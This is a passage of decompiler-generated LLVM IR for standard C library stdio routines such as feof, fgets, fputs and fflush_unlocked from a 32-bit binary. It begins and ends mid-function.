
dec_label_pc_804f1df:                             ; preds = %dec_label_pc_804f1ce
  %v0_804f1df = load i32, i32* @esi, align 4
  %v1_804f1df = add i32 %v0_804f1df, 1
  store i32 %v1_804f1df, i32* %eax.global-to-local, align 4
  %v1_804f1e2 = load i32, i32* @ecx, align 4
  %v2_804f1e2 = inttoptr i32 %v1_804f1e2 to i32*
  store i32 %v1_804f1df, i32* %v2_804f1e2, align 4
  br label %dec_label_pc_804f1f9

dec_label_pc_804f1e6:                             ; preds = %dec_label_pc_804f1ce
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804ee44, i32* %edx.global-to-local, align 4
  %v0_804f1ee = load i32, i32* @esi, align 4
  %v2_804f1ee = sub i32 %v0_804f1ee, %v4_804ee44
  store i32 %v2_804f1ee, i32* %esi.global-to-local, align 4
  %v1_804f1f0 = mul i32 %v2_804f1ee, 4
  %v2_804f1f0 = add i32 %v1_804f1f0, 224
  store i32 %v2_804f1f0, i32* %eax.global-to-local, align 4
  %v2_804f1f7 = load i32, i32* %arg1, align 4
  %v4_804f1f7 = add i32 %v2_804f1f7, %v2_804f1f0
  store i32 %v4_804f1f7, i32* %arg1, align 4
  br label %dec_label_pc_804f1f9

dec_label_pc_804f1f9:                             ; preds = %dec_label_pc_804f1df, %dec_label_pc_804f1e6
  store i32 %tmp76, i32* @edx, align 4
  %v1_804f1fd = add i32 %tmp76, 28
  %v2_804f1fd = inttoptr i32 %v1_804f1fd to i32*
  %v3_804f1fd = load i32, i32* %v2_804f1fd, align 4
  store i32 %v3_804f1fd, i32* %eax.global-to-local, align 4
  %v1_804f200 = add i32 %v3_804f1fd, 2
  br label %dec_label_pc_804f208

dec_label_pc_804f205:                             ; preds = %dec_label_pc_804ee95, %dec_label_pc_804ef2f, %dec_label_pc_804ef62, %dec_label_pc_804efdd, %dec_label_pc_804efc9, %dec_label_pc_804efc0, %dec_label_pc_804f13d, %dec_label_pc_804f0f4, %dec_label_pc_804f03f
  br label %dec_label_pc_804f208

dec_label_pc_804f208:                             ; preds = %dec_label_pc_804f1f9, %dec_label_pc_804f205
  %storemerge6 = phi i32 [ %v1_804f200, %dec_label_pc_804f1f9 ], [ -1, %dec_label_pc_804f205 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804f20b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f20b, i32* @ebx, align 4
  store i32 %v0_804ee43, i32* @esi, align 4
  store i32 %v0_804ee42, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804f197, { 0, 2, 1 }
  uselistorder i32 %v2_804f177, { 1, 2, 0 }
  uselistorder i32 %v1_804f169, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f14a, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804f13d, { 1, 0 }
  uselistorder i32 %v5_804f137, { 1, 2, 0 }
  uselistorder i32 %v0_804f14a, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804f118, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804f12e, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804f0a9, { 1, 2, 0 }
  uselistorder i32 %v1_804f07f, { 1, 2, 0 }
  uselistorder i32 %v0_804f0a9, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804f045, { 1, 0 }
  uselistorder i32 %v1_804f032, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804f03b, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804f025, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804f01b, { 1, 0 }
  uselistorder i32 %v1_804effd, { 1, 0 }
  uselistorder i32 %v0_804f01b.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804efe0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804efd7, { 1, 2, 0 }
  uselistorder i32 %v0_804ef9d, { 1, 0 }
  uselistorder i32 %v1_804ef8f, { 1, 0 }
  uselistorder i32 %v1_804ef8a, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804ef88, { 2, 0, 1 }
  uselistorder i32 %v0_804efaa, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804ef45, { 1, 2, 0 }
  uselistorder i32 %v0_804ef1d, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804ef13, { 1, 2, 0 }
  uselistorder i32 %v6_804ef11, { 0, 2, 1 }
  uselistorder i32 %v0_804ef10, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804ef09, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804ef09, { 2, 1, 0 }
  uselistorder i32 %v1_804ef01, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804eee7, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804eebd, { 0, 2, 1 }
  uselistorder i32 %v0_804eeaa, { 2, 0, 1 }
  uselistorder i32 %v4_804ee44, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -9, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134571979, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80567d5.162 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804f208, { 1, 0 }
  uselistorder label %dec_label_pc_804f205, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f1f9, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ce, { 1, 0 }
  uselistorder label %dec_label_pc_804f193, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f137, { 1, 0 }
  uselistorder label %dec_label_pc_804f10b, { 1, 0 }
  uselistorder label %dec_label_pc_804f073, { 1, 0 }
  uselistorder label %dec_label_pc_804f03f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f016, { 1, 0 }
  uselistorder label %dec_label_pc_804efed, { 1, 0 }
  uselistorder label %dec_label_pc_804efb4, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804ef57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef11, { 1, 0 }
  uselistorder label %dec_label_pc_804ef10, { 1, 0 }
  uselistorder label %dec_label_pc_804eef7, { 1, 0 }
  uselistorder label %dec_label_pc_804eee0, { 1, 0 }
  uselistorder label %dec_label_pc_804eee0.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804f213 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804f216 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f216, i32* %esi.global-to-local, align 4
  %v1_804f21a = add i32 %v4_804f216, 52
  %v2_804f21a = inttoptr i32 %v1_804f21a to i32*
  %v3_804f21a = load i32, i32* %v2_804f21a, align 4
  %v1_804f21d = icmp eq i32 %v3_804f21a, 0
  %v1_804f21f = icmp eq i1 %v1_804f21d, false
  br i1 %v1_804f21f, label %dec_label_pc_804f240, label %dec_label_pc_804f221

dec_label_pc_804f221:                             ; preds = %entry
  %v1_804f221 = add i32 %v4_804f216, 56
  store i32 %v1_804f221, i32* %ebx.global-to-local, align 4
  store i32 %v12_804f213, i32* @eax, align 4
  %v2_804f230 = call i32 @__pthread_return_void(i32 %v12_804f213, i32 134552147)
  %v1_804f238 = call i32 @__pthread_return_0(i32 %v1_804f221)
  %v0_804f242.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f240

dec_label_pc_804f240:                             ; preds = %entry, %dec_label_pc_804f221
  %v0_804f242 = phi i32 [ %v4_804f216, %entry ], [ %v0_804f242.pre, %dec_label_pc_804f221 ]
  %v1_804f242 = inttoptr i32 %v0_804f242 to i16*
  %v2_804f242 = load i16, i16* %v1_804f242, align 2
  %v3_804f242 = zext i16 %v2_804f242 to i32
  store i32 %v3_804f242, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f21f, label %dec_label_pc_804f258, label %dec_label_pc_804f247

dec_label_pc_804f247:                             ; preds = %dec_label_pc_804f240
  store i32 %v12_804f213, i32* @eax, align 4
  %v2_804f250 = call i32 @__pthread_return_void(i32 %v12_804f213, i32 1)
  %v0_804f25b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f258

dec_label_pc_804f258:                             ; preds = %dec_label_pc_804f240, %dec_label_pc_804f247
  %v0_804f25b = phi i32 [ %v3_804f242, %dec_label_pc_804f240 ], [ %v0_804f25b.pre, %dec_label_pc_804f247 ]
  %v1_804f25b = and i32 %v0_804f25b, 4
  ret i32 %v1_804f25b

; uselistorder directives
  uselistorder i32 %v12_804f213, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804f258, { 1, 0 }
  uselistorder label %dec_label_pc_804f240, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f264 = load i32, i32* @edi, align 4
  %v0_804f265 = load i32, i32* @esi, align 4
  %v0_804f266 = load i32, i32* @ebx, align 4
  %v12_804f267 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804f26e = add i32 %arg3, 52
  %v2_804f26e = inttoptr i32 %v1_804f26e to i32*
  %v3_804f26e = load i32, i32* %v2_804f26e, align 4
  store i32 %v3_804f26e, i32* @edi, align 4
  %v1_804f271 = icmp eq i32 %v3_804f26e, 0
  %v1_804f273 = icmp eq i1 %v1_804f271, false
  br i1 %v1_804f273, label %entry.dec_label_pc_804f294_crit_edge, label %dec_label_pc_804f275

entry.dec_label_pc_804f294_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f294

dec_label_pc_804f275:                             ; preds = %entry
  %v1_804f275 = add i32 %arg3, 56
  store i32 %v1_804f275, i32* @ebx, align 4
  store i32 %v12_804f267, i32* @eax, align 4
  %v2_804f284 = call i32 @__pthread_return_void(i32 %v12_804f267, i32 134552147)
  %v0_804f289 = load i32, i32* @ebx, align 4
  %v1_804f28c = call i32 @__pthread_return_0(i32 %v0_804f289)
  %v0_804f295.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f294

dec_label_pc_804f294:                             ; preds = %entry.dec_label_pc_804f294_crit_edge, %dec_label_pc_804f275
  %v0_804f295 = phi i32 [ %arg3, %entry.dec_label_pc_804f294_crit_edge ], [ %v0_804f295.pre, %dec_label_pc_804f275 ]
  %v0_804f294 = load i32, i32* @edx, align 4
  %v4_804f29e = inttoptr i32 %arg1 to i8*
  %v5_804f29e = call i32 @__GI_fgets_unlocked(i8* %v4_804f29e, i32 %arg2, i32 %v0_804f295, i32 %v0_804f294)
  store i32 %v5_804f29e, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f273, label %dec_label_pc_804f2bd, label %dec_label_pc_804f2ac

dec_label_pc_804f2ac:                             ; preds = %dec_label_pc_804f294
  store i32 %v12_804f267, i32* @eax, align 4
  %v2_804f2b5 = call i32 @__pthread_return_void(i32 %v12_804f267, i32 1)
  %v0_804f2c0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f2bd

dec_label_pc_804f2bd:                             ; preds = %dec_label_pc_804f294, %dec_label_pc_804f2ac
  %v0_804f2c0 = phi i32 [ %v5_804f29e, %dec_label_pc_804f294 ], [ %v0_804f2c0.pre, %dec_label_pc_804f2ac ]
  store i32 %v0_804f266, i32* @ebx, align 4
  store i32 %v0_804f265, i32* @esi, align 4
  store i32 %v0_804f264, i32* @edi, align 4
  ret i32 %v0_804f2c0

; uselistorder directives
  uselistorder i32 %v12_804f267, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f2bd, { 1, 0 }
  uselistorder label %dec_label_pc_804f294, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804f2c8 = load i32, i32* @edi, align 4
  %v0_804f2c9 = load i32, i32* @esi, align 4
  %v0_804f2ca = load i32, i32* @ebx, align 4
  %v12_804f2cb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @esi, align 4
  %v1_804f2d2 = add i32 %arg2, 52
  %v2_804f2d2 = inttoptr i32 %v1_804f2d2 to i32*
  %v3_804f2d2 = load i32, i32* %v2_804f2d2, align 4
  store i32 %v3_804f2d2, i32* @edi, align 4
  %v1_804f2d5 = icmp eq i32 %v3_804f2d2, 0
  %v1_804f2d7 = icmp eq i1 %v1_804f2d5, false
  br i1 %v1_804f2d7, label %entry.dec_label_pc_804f2f8_crit_edge, label %dec_label_pc_804f2d9

entry.dec_label_pc_804f2f8_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804f2f8

dec_label_pc_804f2d9:                             ; preds = %entry
  %v1_804f2d9 = add i32 %arg2, 56
  store i32 %v1_804f2d9, i32* @ebx, align 4
  store i32 %v12_804f2cb, i32* @eax, align 4
  %v2_804f2e8 = call i32 @__pthread_return_void(i32 %v12_804f2cb, i32 134552147)
  %v0_804f2ed = load i32, i32* @ebx, align 4
  %v1_804f2f0 = call i32 @__pthread_return_0(i32 %v0_804f2ed)
  %v0_804f2fa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f2f8

dec_label_pc_804f2f8:                             ; preds = %entry.dec_label_pc_804f2f8_crit_edge, %dec_label_pc_804f2d9
  %v0_804f2fa = phi i32 [ %arg2, %entry.dec_label_pc_804f2f8_crit_edge ], [ %v0_804f2fa.pre, %dec_label_pc_804f2d9 ]
  %v0_804f2f8 = load i32, i32* @edx, align 4
  %v4_804f2ff = inttoptr i32 %arg1 to i8*
  %v5_804f2ff = call i32 @__GI_fputs_unlocked(i8* %v4_804f2ff, i32 %v0_804f2fa, i32 %v0_804f2f8, i32 %v0_804f2f8)
  store i32 %v5_804f2ff, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f2d7, label %dec_label_pc_804f31e, label %dec_label_pc_804f30d

dec_label_pc_804f30d:                             ; preds = %dec_label_pc_804f2f8
  store i32 %v12_804f2cb, i32* @eax, align 4
  %v2_804f316 = call i32 @__pthread_return_void(i32 %v12_804f2cb, i32 1)
  %v0_804f321.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f31e

dec_label_pc_804f31e:                             ; preds = %dec_label_pc_804f2f8, %dec_label_pc_804f30d
  %v0_804f321 = phi i32 [ %v5_804f2ff, %dec_label_pc_804f2f8 ], [ %v0_804f321.pre, %dec_label_pc_804f30d ]
  store i32 %v0_804f2ca, i32* @ebx, align 4
  store i32 %v0_804f2c9, i32* @esi, align 4
  store i32 %v0_804f2c8, i32* @edi, align 4
  ret i32 %v0_804f321

; uselistorder directives
  uselistorder i32 %v12_804f2cb, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f31e, { 1, 0 }
  uselistorder label %dec_label_pc_804f2f8, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804f337 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804f337, i32* @eax, align 4
  %v2_804f33c = call i32 @__pthread_return_void(i32 %v2_804f337, i32 134552147)
  %v1_804f348 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  %v0_804f34d = load i32, i32* @global_var_805c4e4.149, align 4
  %v8_804f355 = icmp eq i32 %v0_804f34d, 1
  %v1_804f356 = icmp eq i1 %v8_804f355, false
  br i1 %v1_804f356, label %dec_label_pc_804f3ed, label %dec_label_pc_804f35c

dec_label_pc_804f35c:                             ; preds = %entry
  %v0_804f35c = load i32, i32* @global_var_805c4e8.150, align 8
  %tmp29 = icmp slt i32 %v0_804f35c, 1
  br i1 %tmp29, label %dec_label_pc_804f3ed, label %dec_label_pc_804f369

dec_label_pc_804f369:                             ; preds = %dec_label_pc_804f35c
  store i32 0, i32* @esi, align 4
  %v2_804f376 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804f376, i32* @eax, align 4
  %v2_804f37b = call i32 @__pthread_return_void(i32 %v2_804f376, i32 134552147)
  %v1_804f387 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.152 to i32))
  %v0_804f38c = load i32, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 8
  store i32 %v0_804f38c, i32* %edx.global-to-local, align 4
  %v1_804f3ce3 = icmp eq i32 %v0_804f38c, 0
  %v1_804f3d010 = icmp eq i1 %v1_804f3ce3, false
  br i1 %v1_804f3d010, label %dec_label_pc_804f397, label %dec_label_pc_804f3d2

dec_label_pc_804f397:                             ; preds = %dec_label_pc_804f369, %dec_label_pc_804f3cc
  %v1_804f39714.in = phi i32 [ %v0_804f3cc, %dec_label_pc_804f3cc ], [ %v0_804f38c, %dec_label_pc_804f369 ]
  %v1_804f39714 = inttoptr i32 %v1_804f39714.in to i16*
  %v2_804f397 = load i16, i16* %v1_804f39714, align 2
  %v1_804f39a = add i32 %v1_804f39714.in, 32
  %v2_804f39a = inttoptr i32 %v1_804f39a to i32*
  %v3_804f39a = load i32, i32* %v2_804f39a, align 4
  store i32 %v3_804f39a, i32* @ebx, align 4
  %v1_804f39d = and i16 %v2_804f397, -32720
  %v6_804f3a2 = icmp eq i16 %v1_804f39d, 48
  br i1 %v6_804f3a2, label %dec_label_pc_804f3ab, label %dec_label_pc_804f3a7

dec_label_pc_804f3a7:                             ; preds = %dec_label_pc_804f397
  store i32 %v1_804f39714.in, i32* @esi, align 4
  br label %dec_label_pc_804f3cc

dec_label_pc_804f3ab:                             ; preds = %dec_label_pc_804f397
  %v0_804f3ab = load i32, i32* @esi, align 4
  %v1_804f3ab = icmp eq i32 %v0_804f3ab, 0
  %v1_804f3ad = icmp eq i1 %v1_804f3ab, false
  br i1 %v1_804f3ad, label %dec_label_pc_804f3b7, label %dec_label_pc_804f3af

dec_label_pc_804f3af:                             ; preds = %dec_label_pc_804f3ab
  store i32 %v3_804f39a, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 8
  br label %dec_label_pc_804f3ba

dec_label_pc_804f3b7:                             ; preds = %dec_label_pc_804f3ab
  %v2_804f3b7 = add i32 %v0_804f3ab, 32
  %v3_804f3b7 = inttoptr i32 %v2_804f3b7 to i32*
  store i32 %v3_804f39a, i32* %v3_804f3b7, align 4
  %v0_804f3ba.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f3ba

dec_label_pc_804f3ba:                             ; preds = %dec_label_pc_804f3af, %dec_label_pc_804f3b7
  %v0_804f3c3 = phi i32 [ %v1_804f39714.in, %dec_label_pc_804f3af ], [ %v0_804f3ba.pre, %dec_label_pc_804f3b7 ]
  %v1_804f3ba = add i32 %v0_804f3c3, 1
  %v2_804f3ba = inttoptr i32 %v1_804f3ba to i8*
  %v3_804f3ba = load i8, i8* %v2_804f3ba, align 1
  %v4_804f3ba = and i8 %v3_804f3ba, 32
  %v5_804f3ba = icmp eq i8 %v4_804f3ba, 0
  br i1 %v5_804f3ba, label %dec_label_pc_804f3cc, label %dec_label_pc_804f3c0

dec_label_pc_804f3c0:                             ; preds = %dec_label_pc_804f3ba
  %v1_804f3c4 = call i32 @free(i32 %v0_804f3c3)
  br label %dec_label_pc_804f3cc

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f3ba, %dec_label_pc_804f3a7, %dec_label_pc_804f3c0
  %v0_804f3cc = load i32, i32* @ebx, align 4
  store i32 %v0_804f3cc, i32* %edx.global-to-local, align 4
  %v1_804f3ce = icmp eq i32 %v0_804f3cc, 0
  %v1_804f3d0 = icmp eq i1 %v1_804f3ce, false
  br i1 %v1_804f3d0, label %dec_label_pc_804f397, label %dec_label_pc_804f3d2

dec_label_pc_804f3d2:                             ; preds = %dec_label_pc_804f3cc, %dec_label_pc_804f369
  store i32 %v2_804f376, i32* @eax, align 4
  %v2_804f3db = call i32 @__pthread_return_void(i32 %v2_804f376, i32 1)
  store i32 0, i32* @global_var_805c4e8.150, align 8
  %v0_804f3ed.pre = load i32, i32* @global_var_805c4e4.149, align 4
  br label %dec_label_pc_804f3ed

dec_label_pc_804f3ed:                             ; preds = %dec_label_pc_804f35c, %entry, %dec_label_pc_804f3d2
  %v0_804f3ed = phi i32 [ %v0_804f34d, %dec_label_pc_804f35c ], [ %v0_804f34d, %entry ], [ %v0_804f3ed.pre, %dec_label_pc_804f3d2 ]
  %v1_804f3f2 = add i32 %v0_804f3ed, -1
  store i32 %v1_804f3f2, i32* @global_var_805c4e4.149, align 4
  store i32 %v2_804f337, i32* @eax, align 4
  %v2_804f401 = call i32 @__pthread_return_void(i32 %v2_804f337, i32 1)
  ret i32 %v2_804f401

; uselistorder directives
  uselistorder i32 %v0_804f3cc, { 1, 2, 0 }
  uselistorder i32 %v1_804f39714.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804f34d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f3ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f3cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f3ba, { 1, 0 }
  uselistorder label %dec_label_pc_804f397, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804f40c = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804f40f = load i32, i32* @edi, align 4
  %v0_804f410 = load i32, i32* @esi, align 4
  %v0_804f411 = load i32, i32* @ebx, align 4
  %v4_804f415 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f415, i32* @ebx, align 4
  %v10_804f419 = icmp eq i16* %arg1, inttoptr (i32 134578744 to i16*)
  br i1 %v10_804f419, label %dec_label_pc_804f42d, label %dec_label_pc_804f421

dec_label_pc_804f421:                             ; preds = %entry
  %v2_804f421 = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804f427 = icmp eq i1 %v2_804f421, false
  br i1 %v1_804f427, label %dec_label_pc_804f525, label %dec_label_pc_804f42d

dec_label_pc_804f42d:                             ; preds = %dec_label_pc_804f421, %entry
  store i32 0, i32* @edi, align 4
  %v2_804f43a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804f43a, i32* @ebx, align 4
  %v2_804f43f = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 134552147)
  %v1_804f44b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058254.148 to i32))
  %v0_804f450 = load i32, i32* @global_var_805c4e4.149, align 4
  store i32 ptrtoint (i32* @global_var_8058254.148 to i32), i32* @ecx, align 4
  %v1_804f457 = add i32 %v0_804f450, 1
  store i32 %v1_804f457, i32* @eax, align 4
  store i32 %v1_804f457, i32* @global_var_805c4e4.149, align 4
  %v2_804f460 = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 1)
  store i32 %v2_804f460, i32* @eax, align 4
  %v2_804f473 = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 134552147)
  %v1_804f47f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805823c.152 to i32))
  %v0_804f484 = load i32, i32* bitcast (i32** @global_var_8058238.153 to i32*), align 8
  store i32 %v0_804f484, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805823c.152 to i32), i32* @eax, align 4
  %v2_804f48f = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 1)
  %v0_804f5161 = load i32, i32* @esi, align 4
  %v1_804f5162 = icmp eq i32 %v0_804f5161, 0
  %v1_804f5189 = icmp eq i1 %v1_804f5162, false
  br i1 %v1_804f5189, label %dec_label_pc_804f499, label %dec_label_pc_804f51e

dec_label_pc_804f499:                             ; preds = %dec_label_pc_804f42d, %dec_label_pc_804f513
  %v0_804f4a7 = phi i32 [ %v3_804f513, %dec_label_pc_804f513 ], [ %v0_804f5161, %dec_label_pc_804f42d ]
  %v1_804f499 = inttoptr i32 %v0_804f4a7 to i8*
  %v2_804f499 = load i8, i8* %v1_804f499, align 1
  %v3_804f499 = and i8 %v2_804f499, 64
  %v4_804f499 = icmp eq i8 %v3_804f499, 0
  br i1 %v4_804f499, label %dec_label_pc_804f513, label %dec_label_pc_804f49e

dec_label_pc_804f49e:                             ; preds = %dec_label_pc_804f499
  %v0_804f49e = load i32, i32* @global_var_805826c.151, align 4
  %v9_804f49e = icmp eq i32 %v0_804f49e, 2
  br i1 %v9_804f49e, label %dec_label_pc_804f4c6, label %dec_label_pc_804f4a7

dec_label_pc_804f4a7:                             ; preds = %dec_label_pc_804f49e
  %v1_804f4a7 = add i32 %v0_804f4a7, 56
  store i32 %v1_804f4a7, i32* @ebx, align 4
  store i32 %v2_804f43a, i32* @eax, align 4
  %v2_804f4b6 = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 134552147)
  %v0_804f4bb = load i32, i32* @ebx, align 4
  %v1_804f4be = call i32 @__pthread_return_0(i32 %v0_804f4bb)
  %v0_804f4c6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f4c6

dec_label_pc_804f4c6:                             ; preds = %dec_label_pc_804f49e, %dec_label_pc_804f4a7
  %v0_804f4d9 = phi i32 [ %v0_804f4a7, %dec_label_pc_804f49e ], [ %v0_804f4c6.pre, %dec_label_pc_804f4a7 ]
  %v1_804f4c6 = inttoptr i32 %v0_804f4d9 to i32*
  %v2_804f4c6 = load i32, i32* %v1_804f4c6, align 4
  %v1_804f4c8 = load i32, i32* @ebp, align 4
  %v2_804f4c8 = or i32 %v1_804f4c8, %v2_804f4c6
  %v1_804f4ca = and i32 %v2_804f4c8, 832
  %v2_804f4cf = icmp eq i32 %v1_804f4ca, 320
  %v1_804f4d4 = icmp eq i1 %v2_804f4cf, false
  br i1 %v1_804f4d4, label %dec_label_pc_804f4f9, label %dec_label_pc_804f4d6

dec_label_pc_804f4d6:                             ; preds = %dec_label_pc_804f4c6
  %v1_804f4da = call i32 @__stdio_wcommit(i32 %v0_804f4d9)
  %v1_804f4e2 = icmp eq i32 %v1_804f4da, 0
  br i1 %v1_804f4e2, label %dec_label_pc_804f4eb, label %dec_label_pc_804f4e6

dec_label_pc_804f4e6:                             ; preds = %dec_label_pc_804f4d6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804f4f9

dec_label_pc_804f4eb:                             ; preds = %dec_label_pc_804f4d6
  %v0_804f4eb = load i32, i32* @esi, align 4
  %v1_804f4eb = add i32 %v0_804f4eb, 8
  %v2_804f4eb = inttoptr i32 %v1_804f4eb to i32*
  %v3_804f4eb = load i32, i32* %v2_804f4eb, align 4
  %v2_804f4ee = add i32 %v0_804f4eb, 28
  %v3_804f4ee = inttoptr i32 %v2_804f4ee to i32*
  store i32 %v3_804f4eb, i32* %v3_804f4ee, align 4
  %v0_804f4f1 = load i32, i32* @esi, align 4
  %v1_804f4f1 = inttoptr i32 %v0_804f4f1 to i32*
  %v2_804f4f1 = load i32, i32* %v1_804f4f1, align 4
  %v2_804f4f1.tr = trunc i32 %v2_804f4f1 to i16
  %v1_804f4f6 = and i16 %v2_804f4f1.tr, -65
  %v3_804f4f6 = inttoptr i32 %v0_804f4f1 to i16*
  store i16 %v1_804f4f6, i16* %v3_804f4f6, align 2
  br label %dec_label_pc_804f4f9

dec_label_pc_804f4f9:                             ; preds = %dec_label_pc_804f4c6, %dec_label_pc_804f4e6, %dec_label_pc_804f4eb
  %v0_804f4f9 = load i32, i32* @global_var_805826c.151, align 4
  %v9_804f4f9 = icmp eq i32 %v0_804f4f9, 2
  br i1 %v9_804f4f9, label %dec_label_pc_804f513, label %dec_label_pc_804f502

dec_label_pc_804f502:                             ; preds = %dec_label_pc_804f4f9
  store i32 %v2_804f43a, i32* @eax, align 4
  %v2_804f50b = call i32 @__pthread_return_void(i32 %v2_804f43a, i32 1)
  br label %dec_label_pc_804f513

